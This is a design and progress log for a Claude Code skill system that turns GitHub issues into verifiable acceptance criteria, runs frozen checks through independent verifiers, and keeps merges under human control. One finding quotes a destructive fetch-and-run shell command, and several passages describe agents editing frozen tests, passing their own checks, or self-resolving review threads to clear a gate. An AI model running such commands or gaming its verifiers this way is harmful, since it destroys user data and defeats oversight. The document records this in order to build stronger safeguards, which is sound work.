# agent-sessions — design

Captured 2026-07-23 from the originating brainstorm. This is the reasoning trail behind
the two-skill system, kept so the *why* survives.

## Origin

Burning down the [decafclaw](https://github.com/users/lmorchard/projects/6) project board
manually — pick issue → spec → plan → execute → PR → request Copilot review → address
comments → merge. Question: how to push more of that loop toward autonomy, escalating to
a human only for issues that actually need it.

## The one principle

**An agent is only as autonomous as its verifier is trustworthy.**

**Corollary (added from prior-art survey, see [prior-art.md](prior-art.md)):** trustworthy
means the *oracle itself* must be validated. "Criterion is machine-checkable" is necessary
but **not sufficient** — the check must also be *correct*, the verifier must be
**independent of the implementer**, and acceptance tests **frozen before implementation**
so the implementer can't weaken them (SWE-bench documents test-log misparsing; Anthropic
names self-verification bias). An untrustworthy green check is worse than no check.

(From Anthropic's ["Enabling Claude Code to work more autonomously"](https://www.anthropic.com/news/enabling-claude-code-to-work-more-autonomously)
and the long-running-agent research: if the agent can check its own work with a near-perfect
oracle, it can run; where the oracle is weak or missing, a human belongs.)

The manual loop already has **strong oracles in the middle** (`make check`, `make test`,
evals, Copilot review) and **weak oracles at the two ends**:
- front: *"is this issue well-specified enough to attempt unattended?"*
- back: *"is this PR safe to merge?"*

So: automate the strong-oracle middle; keep humans on the weak-oracle ends. The rest of
the design falls out of that.

## What to front-load (and what not to)

Ranked by leverage for autonomy:

1. **Verifiable acceptance criteria — the biggest lever.** A spec that says *what* to
   build defines the target; a spec that says *"done means X, and here's the check that
   proves it"* defines the **oracle**. That's what lets the loop grade itself. The
   criteria must resolve to something runnable (`test_x` passes, `make check` green, a new
   eval case), not prose a human eyeballs.
2. **Board triage / priorities** — powers *selection and throughput*, a different axis. It
   decides which issue the loop picks up and whether it's ready. Valuable, but it doesn't
   make any individual issue get built better.
3. **Pre-attached plans — weakest, mildly counterproductive.** A plan written at *filing*
   time is stale by *execution* time (the repo moved), and planning against live code is
   exactly what the model is good at doing fresh. **Generate the plan at execution time**
   (launch research subagents against current state, then compose) — don't freeze it at
   triage.

**Missing from the naive model:** the front-loaded metadata that specifically buys
autonomy is the **escalation signal**, not the plan. At triage, stamp: is this safe
unattended? (`auto-ok` vs `needs-review`), likely paths touched, rough size.

**Cost caveat:** front-loading only pays when the artifact is *reusable* (agent + Copilot
+ future-you read it) or *doubles as the verifier*. Small/mechanical issues should skip
the ceremony: one-line criterion, `auto-ok`, done. If speccing takes as long as doing,
you've moved the work earlier, not gained leverage.

## The reframe

**A good spec names its own verifier.** When you can write the acceptance criterion as a
check the loop can run, that issue is a candidate for the autonomous middle. When the only
honest test is "human decides," that's not a spec failure — it's the issue *telling you*
it belongs in `needs-review`. The criteria do double duty: power execution *and* sort
issues into autonomy tiers for free.

## The capability ladder (Claude Code, verified against docs 2026-07-23)

1. **Headless CLI** — `claude -p --bare --allowedTools "..." --output-format json`.
   `--bare` skips CLAUDE.md/hooks/MCP autodiscovery for reproducible CI (slated to become
   the `-p` default). `--permission-mode dontAsk` = locked-down mode (denies anything
   outside allow-rules). JSON output carries `total_cost_usd` + `session_id`;
   `--continue`/`--resume` chain sessions.
   [docs](https://code.claude.com/docs/en/headless)
2. **GitHub Actions** (`anthropics/claude-code-action@v1`) — the "runs without my laptop"
   unlock. Auto-detects `@claude` mention mode vs `prompt:` automation mode; the prompt
   form runs on *any* event including `schedule:` cron. Vertex via Workload Identity
   Federation (matters for decafclaw's multi-provider setup). Separate
   [GitHub Code Review](https://code.claude.com/docs/en/code-review) posts reviews on every
   PR with no trigger. [docs](https://code.claude.com/docs/en/github-actions)
3. **Agent SDK** (Python/TS) — full programmatic loop w/ hooks + subagents. **Overkill for
   decafclaw**: it's *already* an agent runtime with its own hooks/subagents/workflow
   engine. Building a second orchestrator to drive the first is redundant.
4. **Hooks** — `PreToolUse` can hard-block even under `bypassPermissions`; guardrails, not
   the primary loop.

Note on trusting research: the first-pass research subagent produced a wall of confident
detail; several specifics ("Claude Code Routines," a C-compiler blog's cost figures,
Pro/Max daily run limits, a specific CVE version) could **not** be verified and were
dropped. Distrust-and-verify is the same principle as the burndown loop, applied to the
research agent — its verifier (the human) has to be good, because unverified confident
output is exactly what weak oracles produce.

## Phased rollout (increasing autonomy, each reversible)

1. **Self-driving skill, local, human at the merge gate.** Package the manual loop as one
   command that runs spec → research → plan → execute → `make check && make test` → open
   PR with an `--allowedTools` allowlist, and *stops before merge*. Runs on-machine,
   watchable, interruptible. Lowest risk, highest immediate leverage.
2. **Scheduled GitHub Action opening draft PRs.** Same loop, no laptop required. Branch
   protection keeps merge human-gated. Second workflow triggered on Copilot review
   addresses comments.
3. **Conditional auto-merge.** Only `auto-ok` issues with all-green checks + no unresolved
   review threads. auth/data/deploy/`.github`/new-deps stay human-gated (aligns with the
   standing never-deploy-without-permission rule). Start conservative: auto-merge nothing
   until Phase 2 has earned trust.

**Safety:** avoid `--dangerously-skip-permissions` / `bypassPermissions`. Scoped
`--allowedTools` + `dontAsk` gets ~95% of the autonomy with a real floor under it.

## The two-skill system

### intake skill (grilling-derived, human-in-loop)

Lives at the weak-oracle front end. Job: turn a wishlist stub into a spec whose criteria
are runnable checks, plus an escalation tier — and emit a filable issue.

Built on Matt Pocock's [grilling skill](https://github.com/mattpocock/skills/blob/main/skills/productivity/grilling/SKILL.md),
which is a near-perfect engine. Its mechanics map directly:

- **"Probe the environment for factual matters rather than asking"** = the
  research-subagents-then-plan instinct. The skill dispatches Explore/research agents to
  answer *factual* questions about the codebase (does this pattern exist? current shape?
  is there a test harness?) and spends the human's attention only on *decisions*.
- **"Provide your recommended answer alongside each question"** = kills the overhead risk.
  Inverts authoring effort: instead of "what are the acceptance criteria?" (blank page),
  the skill — having researched — *proposes* criteria as runnable checks and the human
  ratifies/corrects. Fast triage, not a dreaded form.
- **"One question at a time, walk the decision tree resolving dependencies"** = the spine:
  definition → scope boundaries → each criterion → (derived) tier.
- **"Don't act until shared understanding is confirmed"** = the human-in-loop gate.

What intake *adds* on top of grilling (the thin, opinionated layer):

1. **A fixed target schema** instead of open-ended "shared understanding" — driving toward
   *definition + verifiable criteria + escalation tier*; done when those slots are filled.
2. **Verifiability as the per-branch success test** — refuses to close a criterion while
   it's still a wish; its recommended answer is *always* a runnable check, and "how would
   you actually know?" is the standing follow-up.
3. **An output artifact** — emits the filable issue body + labels, tier *inferred* from
   whether every criterion resolved to a check (all checks → `auto-ok`; any "human decides"
   → `needs-review`).

Scope guardrail: intake is for **heavier issues only**. Small/mechanical ones skip it.

### execution skill (self-driving, autonomous middle)

Phase 1 above. Consumes a well-specified issue; runs the loop; stops at the merge gate.

### shared contract

The seam between intake's *output* and execution's *input*: the acceptance-criteria format
+ escalation labels. Design once, both read from it. (In the spirit of decafclaw's
"don't hand-maintain parallel field lists that rot in lockstep.")

## Finding (2026-07-23, later): dev-session already IS the producer/consumer core

Studied the existing `~/.claude/skills/dev-session` skill (SKILL.md + phases + references).
It already implements most of the two-skill system sketched above — not "similar to," but
*is* it. The sequel is therefore an **upgrade + orchestration layer**, not a reimplementation.

Already covered by dev-session:

| Sketched as "new" | Where it already lives |
|---|---|
| Producer/consumer split | `file` (produces spec-embedded issue) → `express` (autonomously consumes); `<!-- dev-session:spec -->` marker = the shared contract/seam |
| Research-then-plan-live | `brainstorm` documentarian substep → `research.md`; plan generated at `plan`/`express` time, never frozen at filing |
| Grilling-style interview | `brainstorm` step 3: propose best judgment + trade-offs, confirm/adjust, no open-ended Qs, multiple-choice preferred |
| Crude autonomy tier | `express` Phase 0 complexity check (pushes back on L/XL/ambiguous); feel-driven carve-out refuses autonomous execution of subjective visual work |
| Board transitions | Ready → In Progress → In Review via `references/github-projects.md` |
| Spec-readiness gate | Readiness checklist in `spec-template.md` |
| Scope proportional to complexity | `brainstorm` step 4 |

The genuine gaps — the ~20% that is actually new and high-leverage:

1. **Verifiable acceptance criteria as first-class (the core gap).** spec-template's
   "Desired end state" is *prose* (user-visible behavior, API surface); the Readiness
   checklist gates on placeholders / consistency / scope / ambiguity but **nothing requires
   each criterion to name a runnable check.** Upgrading spec-template + the readiness
   checklist to demand a runnable oracle per criterion (`test_x` passes, `make check`
   green, an eval case) is the highest-value change — and it's small. This is
   "a good spec names its own verifier" made concrete.
2. **A durable, verifiability-derived tier label** stamped at `file` time (not decided
   ad-hoc at `express` Phase 0), so a board/cron loop can *route* on it. The tier falls
   out of "did every criterion resolve to a check?" (all → `auto-ok`; any human-eyeball →
   `needs-review`).
3. **The merge gate.** `express` stops at PR-with-Copilot-addressed; merge is human.
   Conditional auto-merge by tier (all-green + no unresolved threads + `auto-ok`) is new.
4. **The board-level driver.** Nothing today *picks the next Ready issue and runs `express`
   unattended*, then advances. That orchestration (headless `claude -p` / scheduled GHA)
   is the actual "burndown loop" and sits *above* a per-issue skill.

Reframed build: (1)+(2) are **enhancements to dev-session** (spec-template, brainstorm,
readiness checklist, `file`). (3)+(4) live *above* a per-issue skill — the orchestration
bookends. So "standalone skill vs dev-session phase" resolves mostly toward *extend
dev-session*; the separate artifact is the driver + merge gate.

## Build status (2026-07-24)

Decided: **single `agent-session` skill, multi-mode dispatcher** (dev-session lineage), not
separate skills. Rationale: sidesteps the unverified cross-skill file-sharing mechanism
entirely (all refs in-dir), and the dispatcher's lazy-load means modes never co-reside, so
adding modes doesn't confound the LLM mid-phase — the only confounding risk is at the entry
boundary, mitigated by explicit mode arguments + an ask-don't-guess dispatcher. Heavy modes
fan out to subagents; the board-driver stays *above* the skill as orchestration.

Built (front-of-funnel), in `skills/agent-session/`:
- `SKILL.md` — dispatcher, context-management notes, conventions.
- `references/acceptance-criteria.md` — **the novel core**: every criterion names a runnable
  check; verifier-independence + freeze-before-implementation; concrete-test → property →
  human-judgment escalation ladder; **oracle-must-already-exist** rule; tier derivation
  (auto-ok/needs-review) + risk-gated-path override.
- `references/criteria-grammar.md` — EARS (five patterns, verified against Mavin) +
  Given-When-Then syntax reference.
- `references/spec-template.md` — criteria replace prose "desired end state"; readiness
  checklist gates on *verifiability*.
- `references/documentarian-prompt.md` — neutral negation rules for the research subagent
  (shared by intake + triage); includes the oracle-existence question.
- `phases/intake.md` — new + existing-issue (augment) modes; reduce each requirement to
  criterion+check; verify each check's oracle exists *now*; derive tier; file/update issue.
- `phases/triage.md` — batch backlog-gardening; subagents fan out to assess + draft proposed
  criteria, human ratifies in a fast pass, augment in place.

Built (back half, move 1), in `skills/agent-session/`:
- `references/frozen-checks.md` — **the back-half novel core**: the `checks.md` manifest
  (criteria copied verbatim, stable `C1…Cn` ids), the freeze commit, the read-only rule, the
  independent verifier subagent, the `git diff <freeze-sha>` tamper check, and the amendment
  path (stop → human-confirm → log → **downgrade the run to `needs-review`**).
- `phases/plan.md` — gates on verifiability, re-verifies oracles still exist, **Phase 0 is the
  freeze** (written before the rest of the plan), bidirectional criteria coverage in self-review.
- `phases/execute.md` — per-criterion checks by name as the gate; frozen files read-only to
  implementers; independent verifier + tamper diff, not self-report; evidence produced for
  human-judgment criteria.
- `phases/pr.md` + `references/pr-body-template.md` — the **tiered merge gate**, derived by
  reading rows (all checks pass per the verifier + human-graded judgment criteria + clean
  tamper diff + green project gates + no unresolved threads + `auto-ok` + no risk-gated paths).
  Emits a machine-readable `<!-- agent-session:gate -->` block. **Never merges.**
- `phases/express.md` — Phase 0 checks *preconditions* (marker / readiness / size) instead of
  judging complexity by feel; a missing marker routes to `intake`. Tier decides only *where the
  run surfaces to a human*, not whether it runs.
- `references/session-setup.md`, `references/plan-template.md`, `references/github-projects.md`.

Validated:
- **intake — micro-tested AND dogfooded.** Micro-test (Sonnet, control vs treatment, 5
  reps/arm) on the criteria-gate wording: control 0/5 checkable, treatment 5/5 → wording is
  load-bearing; a 4:1 tier-split surfaced the oracle-must-exist gap, fix closed it 5/5.
  Then dogfooded end-to-end on a real issue (starnet #129) via the augment path — filed
  criteria + `auto-ok` tier back to the issue; the run surfaced + fixed two skill gaps
  (missing documentarian ref; missing oracle-verification step).
- **triage — built, NOT yet dogfooded.**
- **frozen-checks read-only rule + amendment path — micro-tested, LOAD-BEARING.** Fixture: a
  frozen check whose assertion contradicts its own criterion, implementation already correct.
  Control 4/5 diagnosed the contradiction and then **edited the frozen check inline**; 1/5
  asked. Treatment 0/5 edited, 5/5 stopped with the prescribed check-vs-criterion statement.
  No over-triggering. Caveat: a clean no-guidance control is unreachable on this machine (the
  global CLAUDE.md's "no weakening test assertions" leaks into every `claude -p` run), so the
  effect is a **lower bound**.
- **"run each check by name / aggregate green is not the gate" — micro-tested, NOT load-bearing.**
  20 reps across two fixtures (including one where the implementation *looks* done — an
  idiomatic dict dedup keeping the last occurrence where the criterion wants the first, with
  `make check` green): both arms caught it 10/10. **The `checks.md` manifest naming the exact
  command is the mechanism; the exhortation adds nothing** — so it was trimmed to one sentence.
  Two earlier fixtures were discarded as non-discriminating; recording that because "control
  passed 5/5" is only evidence about wording when the fixture can actually fail.
- **execute mid-run mechanics + the pr gate — NOT yet exercised by a real run** (see below).

Dogfood of move 1 (starnet #129) — **stopped at Phase 0, correctly.** AC1 ("SHALL produce zero
`tick-cap` runs", checked by a census invocation) **already passes on current code**:
`{"trace": 20}` at both grade A and S. `census.js` has no placement flag, so the issue's
"S @ switch-1" evidence isn't reachable through AC1's command, and `tick-cap`
(`scripts/bot/loop.js:130`) never fires because the bot dies to trace first. AC1 is vacuous —
it cannot distinguish done from untouched, so the `auto-ok` tier isn't supported. `plan`/
`frozen-checks` caught it exactly where designed ("a check that passes at freeze — surface it").

The miss was upstream, and is now fixed: `acceptance-criteria.md` required the oracle to
**exist** but never to **discriminate**, and intake's step 4 accepted a grep. New rule: *run*
the check, confirm it fails, record the failure; a past evidence table is not a substitute.
Tell: a "SHALL produce zero X" criterion whose command produces zero X today. Also clarified
that oracle-must-exist turns on *whose judgment* (a labeled corpus defers a human decision) and
not on *whether a test file exists yet* (an ordinary unit test the criterion fully specifies is
written at Phase 0) — otherwise the rule would send every criterion to `needs-review`.

### Second intake dogfood — decafclaw #638 (filed 2026-07-24)

Switched the move-1 dogfood vehicle off starnet #129 (its remaining path needs a census
placement flag — an oracle-building prerequisite, i.e. an intake conversation, not a test of the
execution modes) to **decafclaw #638** (`forkpty` DeprecationWarnings dirty the suite). decafclaw
is the repo the system was designed to burn down and has a real pytest harness. Filed via the
augment path: marker + criteria + tier, original text preserved verbatim (concatenation).

Three findings, all from *running* things rather than reading them:

1. **The intuitive check was vacuous again.** `pytest -W error::DeprecationWarning` **passes**
   today — the warning is emitted in the forked child, so promoting it to an error catches
   nothing. Had that been stamped as the check it would have gone green immediately and proven
   nothing. The discriminating check asserts on the `warnings summary` section instead. That is
   **two for two** (#129's AC1, #638's obvious check) — the vacuous check looks like the *default*
   outcome when nobody runs the check before freezing it, not a rare slip.
2. **The issue's own facts were wrong in a way that mattered.** It says `test_terminals.py`
   spawns twice; it's actually two different files, one spawn each — which changes the mechanism
   (two marks in two files, not two in one). Verified counts: `make test` → 3234 passed, 2
   skipped, 2 warnings, 69s.
3. **Criteria vs. guards** (see below). #638 honestly reduces to **one criterion + three guards**,
   and there was nowhere to put guards.

Also noted: the chosen mechanism (per-test marks) is what *keeps* the issue `auto-ok` — the
`pyproject.toml` alternative touches build/CI config, which the risk-gated list pulls toward
`needs-review`. Mechanism choice and tier are coupled, which wasn't obvious before.

### Criteria vs. regression guards (added 2026-07-24)

The discriminate rule opened a gap: "the full suite stays green" and "output is byte-identical"
can never fail at freeze, so as criteria they're vacuous — yet they obviously want checking. Two
dogfoods hit it from opposite directions (the pure-refactor exemplar presenting a golden test as
a CRITERION; #638 landing as 1 criterion + 3 guards), so it was a hole, not a wording nit.

A **criterion** says what the work must *newly* make true (must fail now); a **guard** says what
it must not break (must pass now). Guards don't affect the tier. Wired through both engines and
every consumer — manifest section, spec slot, readiness item, per-phase verification, the
verifier's remit, and a `guards:` field in the gate block. They earn their place by catching one
specific cheat: **making a criterion go green by deleting the coverage that contradicted it**,
which leaves every criterion passing and the suite green, and only a guard notices.

### Move 1 dogfood COMPLETE — decafclaw #638 → PR #659 (2026-07-24)

Ran `plan` → `execute` → `pr` end to end on decafclaw #638, stopping at the gate.
[PR #659](https://github.com/lmorchard/decafclaw/pull/659): all criteria and guards pass, tamper
diff clean, **verdict `human-merge-required`** — see thread hole below. The whole back half now
has real-run evidence.

**The verifier caught its own author.** The scoped tamper constraint I wrote mid-run said "every
added line MUST be a `@pytest.mark.filterwarnings` decorator", but the plan also required an
explanatory comment per mark. My own mechanical check used a looser regex allowing comments —
i.e. I silently applied the rule's intent rather than its letter and passed myself. The
independent verifier (dispatched as `Explore`, which has **no Edit/Write**, so it structurally
cannot touch the oracle it grades) read the constraint literally and reported the mismatch.

Les's call on the resolution was right and corrected an over-strict instinct: comments are inert
to pytest and cannot weaken an assertion, so this is a *mis-stated rule*, not an oracle change.
The generalizable lesson is stronger than the strictness I was defending — **a tamper rule that
fires on inert changes produces false positives, and false positives train the operator to wave
the mechanism through.** State tamper rules as invariants over *what a check asserts*, never as
whitelists of allowed line forms. This also produced the **amendment vs. clarification** split
(amendment changes what a check asserts → downgrade; clarification fixes wording that never
matched its own intent → logged, human-adjudicated, no downgrade).

**The same defect class appeared twice in one run.** Guard G1 pinned `3234 passed, 2 skipped`;
the rebase pulled in upstream tests and it read `3265`, tripping the letter while the property
("nothing lost, newly skipped, or newly failing") held. Brittle absolutes encoding relative
invariants — worth watching for as a category, not two one-offs.

**Three gate holes found, all fixed in `pr.md`:**
1. **Disputed threads must not be self-resolved.** Copilot filed 4 comments; 3 were factually
   wrong (its claim that the warning message contains a newline defeating the regex — refuted by
   `repr()`: single line, `re.match` succeeds; it was misled by a hard line-wrap inside a code
   fence in the issue body my `spec.md` copied) and 1 was already answered in the artifact.
   Skipping them is right, but *resolving* them would have cleared the gate's "no unresolved
   threads" condition on the agent's own say-so — self-satisfiable, therefore meaningless. Rule:
   resolve only what you fixed. This is why #659 ends at `human-merge-required`, which is the
   gate working, not failing.
2. **Rebase invalidates the freeze sha** (rewritten commit → baseline outside branch history).
3. **Squash destroys the freeze commit**, so the tamper baseline is unreachable afterwards.

**Also found:** `session-setup.md` hardcodes `.worktrees/` — decafclaw already uses
`.claude/worktrees/`, so it must detect the project's existing convention. And the freeze
procedure said "commit, record the sha", which is impossible in one commit (a commit can't
contain its own hash) — needs a follow-up commit.

### `triage` dogfood — 8 decafclaw issues (2026-07-24)

Fanned out 8 read-only subagents (`Explore` type — no Edit/Write, so a scanner can't modify the
repo it scores) over decafclaw `585/586/600/601/624/625/649/566`. Each assessed, drafted criteria
+ guards, and **ran every proposed check**.

**Headline: 0 of 17 proposed criteria passed today.** The discriminate rule held across eight
independent unsupervised contexts — stronger evidence than the micro-test it never got. What the
rule *admits* turned out to be the problem instead.

Results: 3 `auto-ok` (586, 600, 601), 5 `needs-review` (585, 624, 649, 566, 625). But **only #586
is genuinely ready** — #600's criterion is satisfied by `def test_x(): pass` and #601's by typing
the word "separate". A ~1-in-8 conversion rate is the number that should govern board-driver
expectations.

Three findings, two of which became rules:

1. **Goal-level ambiguity is the dominant blocker** — all five `needs-review` calls, none from the
   risk-gated list alone. Now a third tier trigger, with the #586-vs-#585 discriminating test
   (*does the choice change which criteria apply?*).
2. **Gameability is the missing third oracle test** (exists → discriminates → *can it pass without
   the work?*). Three shapes observed. Includes the hard case: when the deliverable is a test, the
   work IS the oracle and the freeze/implement split degenerates. Also propagated intake's
   don't-fudge-a-weak-check rule into `triage` — it existed but never reached the scanners, so two
   went proxy-hunting in good faith.
3. **The guards came out better than hand-written ones.** #566 produced a negative control
   (tabstack must stay *un*discovered when the key is genuinely absent — blocks an over-broad fix);
   #625 guarded `test_no_agent_side_imports`, the architectural boundary a careless fix would
   violate. Neither prompted.

**Live security finding (decafclaw #649):** the heartbeat shell bypass reproduces —
`shell_tools.py:142-144` short-circuits on `ctx.user_id == "heartbeat-admin"` *before any pattern
check*, so unattended turns auto-approve arbitrary commands (`curl evil.sh | sh; rm -rf ~` →
`{'approved': True}`). Directly relevant here: **the board-driver would run unattended.** Needs a
decision before Phase 2. The metacharacter half of #649 was already fixed by #652.

Augmented on GitHub (marker + criteria + guards + tier, author text preserved verbatim): **585**
(`auto-ok` after Les resolved its decision), **586** (`auto-ok`), **566 / 625 / 649**
(`needs-review`, each carrying its live reproduction). Held: 600/601 pending the gameability rule,
624 because its author wants production data first.

**Queue state: 2 `auto-ok` issues ready for the loop** (585, 586).

Pending: the **board-driver** orchestration (above the skill); `express` still never run; the
`needs-review` routing branch still unexercised; an interactive-intake check of the empty-state
observation; and a consolidation/trim pass — the skill gained ~10 rules in a day, and only two of
them (the read-only rule, and the discriminate rule via this batch) have real evidence behind them.

Testing calibration (agreed, still holds): workflow/reference skill derived from a proven
one — scaffold structurally without pressure-scenario TDD; micro-test only novel
behavior-shaping wording against a no-guidance control (5+ reps, read every match by hand);
don't add nuance clauses to a winning recipe; dogfood after building. Full pressure
scenarios deferred until there's something worth hardening.

## Resolved (was open)

- Criteria grammar → **EARS + Given-When-Then** (not invented); see `criteria-grammar.md`.
- Property middle tier → **done** (in the escalation ladder).
- dev-session edits vs. overlay → **fresh single `agent-session` skill** this repo owns.
- Prior-art → surveyed; see `prior-art.md`.

## Open questions (for the pending work)

- **Board-driver (later):** local `claude -p` loop vs. scheduled GHA; how it reads/filters
  the Ready queue by tier. Stays *above* the skill. It can now read the PR body's
  `<!-- agent-session:gate -->` block rather than re-deriving the gate.
- **Does the discriminate rule need micro-testing?** It was written from a dogfood failure, not
  tested as *wording*. The intake-side analogue (oracle-must-exist) needed a micro-test to
  land, so this one plausibly does too.

## Resolved in move 1 (were open)

- **Verifier-independence mechanics** → `references/frozen-checks.md`: freeze commit, read-only
  frozen paths, check-author subagent that never sees the implementation plan, verifier subagent
  that never sees the plan or the rationale, and a `git diff <freeze-sha>` tamper check. The
  mechanical tamper diff is what turns the principle into a check; the read-only wording is
  micro-tested load-bearing.
- **Merge gate** → derived in `pr.md` by reading rows, reported as a verdict + a machine-readable
  gate block, never acted on. `needs-review` is never eligible however green the checks.
- **Where the tier lives** → **the issue body's Tier section is authoritative** (it carries the
  reason); a label is a convenience index for querying. If they disagree, surface the conflict
  rather than picking one. This works today without labels existing in target repos — #129 has
  no labels at all.
- **Amendment policy** → amend is allowed but costly: stop, human-confirm, log in `checks.md`,
  and downgrade the run to `needs-review`. Keeps the loop unstuck on a typo'd check while making
  an amended oracle forfeit the autonomy it can no longer support.
